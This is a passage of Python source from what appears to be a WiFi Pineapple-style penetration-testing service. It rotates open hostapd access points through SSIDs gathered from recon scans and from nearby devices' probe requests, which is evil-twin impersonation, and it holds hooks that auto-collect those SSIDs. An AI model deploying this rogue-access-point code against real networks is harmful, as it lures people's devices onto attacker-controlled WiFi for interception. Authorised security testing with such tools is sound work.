                        and s not in ssids):
                    ssids.append(s)
            if not ssids:
                ssids = [snap.get("primary_ssid") or "PineApple"]

            for ssid in ssids:
                if self._impersonation_stop.is_set():
                    break
                bssid = self._rotation_bssid(ssid, snap)
                body = hostapd_tool.render_config(
                    iface=iface, ssid=ssid, password=None, channel=channel,
                    hw_mode=hw_mode, primary_bssid=bssid, hidden=False,
                    extra_bsses=[], **self._write_mac_acl(snap),
                )
                hostapd_tool.write_config(HOSTAPD_CONFIG_PATH, body)
                ok, _msg = hostapd_cli.reload(iface)
                if not ok and not stub_mode():
                    log.info("impersonation: reload not honoured, restarting hostapd")
                    self._restart_hostapd_job()
                with self._lock:
                    self._state["impersonate_current_ssid"] = ssid
                    self._save_state()
                self._emit_impersonation(ssid, bssid)
                self._impersonation_stop.wait(dwell)
                if self._impersonation_stop.is_set():
                    break

    def _restart_hostapd_job(self) -> None:
        """Fallback for the impersonation rotation when hostapd_cli reload
        doesn't pick up the SSID change: SIGTERM the current hostapd job
        and relaunch from the freshly-written config."""
        import signal as _sig
        from app.services.job_manager import job_manager
        from app.tools._common import stub_mode
        if stub_mode():
            return
        with self._lock:
            old = self._state.get("hostapd_job_id")
        if old:
            try:
                job_manager.stop_job(old, grace=2.0, first_signal=_sig.SIGTERM)
            except Exception:
                pass
        try:
            job = job_manager.start_job(
                ["hostapd", str(HOSTAPD_CONFIG_PATH)],
                name="pineap-hostapd-impersonate", tags=["pineap"],
            )
            with self._lock:
                self._state["hostapd_job_id"] = job.id
                self._save_state()
        except Exception:
            log.exception("impersonation: hostapd restart failed")

    def _emit_impersonation(self, ssid: str, bssid: str) -> None:
        try:
            from app import socketio
            socketio.emit("impersonate:rotate",
                          {"ssid": ssid, "bssid": bssid}, namespace="/")
        except Exception:
            pass


# ---------- Module singleton ----------

_service: "PineAPService | None" = None


def get_service() -> PineAPService:
    global _service
    if _service is None:
        from flask import current_app
        _service = PineAPService(current_app.config["DATA_DIR"])
    return _service


# ---------- Auto-population hooks (called by recon service) ----------

def auto_add_from_recon(ssids: list[str]) -> None:
    """Fire-and-forget add of SSIDs observed in a recon scan. Quiet on
    failure — auto-collection should never break the calling code path."""
    if not ssids:
        return
    try:
        svc = get_service()
    except Exception:
        # current_app missing (no app context) — happens in tests and
        # during early startup before the recon poller is wired
        return
    for s in ssids:
        if not s:
            continue
        try:
            svc.add_ssid(s, source=SOURCE_RECON)
        except Exception:
            log.exception("pineap.auto_add_from_recon failed for %r", s)


def auto_add_from_probes(ssids: list[str]) -> None:
    """Fire-and-forget add of SSIDs from directed probe requests."""
    if not ssids:
        return
    try:
        svc = get_service()
    except Exception:
        return
    for s in ssids:
        if not s:
            continue
        try:
            svc.add_ssid(s, source=SOURCE_PROBE)
        except Exception:
            log.exception("pineap.auto_add_from_probes failed for %r", s)
